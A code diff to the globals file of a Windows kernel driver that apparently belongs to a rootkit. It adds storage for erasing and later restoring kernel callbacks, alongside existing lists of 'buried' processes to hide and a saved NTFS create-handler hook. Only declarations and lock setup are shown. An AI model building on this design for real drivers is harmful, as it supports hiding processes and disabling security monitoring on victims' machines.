@@ -3,6 +3,7 @@
 #include <ntifs.h>
 #include <wdf.h>
 #include "WinTypes.hpp"
+#include "Vector.hpp"
 
 namespace BeGlobals
 {
@@ -14,11 +15,19 @@ namespace BeGlobals
 #include "AutoLock.hpp"
 
 #define MAX_BURIED_PROCESSES 256
+#define MAX_ERASE_CALLBACKS 256
 
 typedef struct _WCHAR_ARRAY {
     WCHAR* array[MAX_BURIED_PROCESSES];
     INT length;
 } WCHAR_ARRAY;
+
+typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
+    LONG64 addrOfCallbackFunction[MAX_ERASE_CALLBACKS];
+    LONG64 callbackToRestore[MAX_ERASE_CALLBACKS];
+    CALLBACK_TYPE callbackType[MAX_ERASE_CALLBACKS];
+    INT length;
+} KERNEL_CALLBACK_RESTORE_INFO_ARRAY_ARRAY;
 
 typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 
@@ -33,10 +42,12 @@ typedef NTSTATUS(*OBREFERENCEOBJECTBYNAME)(PUNICODE_STRING ObjectName, ULONG Att
 namespace BeGlobals
 {
     WCHAR_ARRAY beBuryTargetProcesses = { { NULL }, 0 };
+    KERNEL_CALLBACK_RESTORE_INFO_ARRAY_ARRAY beCallbacksToRestore = { { NULL }, { NULL }, { CallbackTypeNone }, 0 };
 
     // Mutexes
     FastMutex buryLock = FastMutex();
     FastMutex processListLock = FastMutex();
+    FastMutex callbackLock = FastMutex();
 
     NTFS_IRP_MJ_CREATE_FUNCTION originalNTFS_IRP_MJ_CREATE_function = NULL;
 
@@ -55,6 +66,11 @@ namespace BeGlobals
         // Get base address of ntoskrnl module
         NtOsKrnlAddr = BeGetKernelBaseAddr();
         LOG_MSG("ntoskrnl.exe base addr:0x%llx\n", (UINT64)NtOsKrnlAddr);
+
+        // init locks
+        buryLock.Init();
+        processListLock.Init();
+        callbackLock.Init();
 
         // Function resolving
         pZwTerminateProcess = (ZWTERMINATEPROCESS)BeGetSystemRoutineAddress("ZwTerminateProcess");
